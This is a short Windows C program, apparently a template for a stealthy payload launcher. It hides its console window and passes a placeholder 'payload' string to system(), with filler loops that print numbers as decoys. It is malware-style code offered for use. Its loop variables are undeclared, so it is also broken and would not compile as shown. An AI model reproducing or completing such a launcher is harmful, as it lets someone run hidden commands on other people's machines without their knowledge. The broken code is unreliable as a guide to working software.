//code  snippet inspired from linuxchoice but its no more presnet on github
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
void loop1() {
    for(i = 1; i <= 2; i++){
      printf("%d ",i);
    }
}
void loop2() {
    for(a = 1; a <= 2; a++){
      printf("%d ",a);
    }
}
int main(int argc, char *argv[])
{
ShowWindow (GetConsoleWindow(), SW_HIDE);
char cmd[50000];
strcpy(cmd, "payload");
system(cmd);
int l;
for(l = 1; l <= 2; l++){
printf("%d ",l);
}
return 0;
}
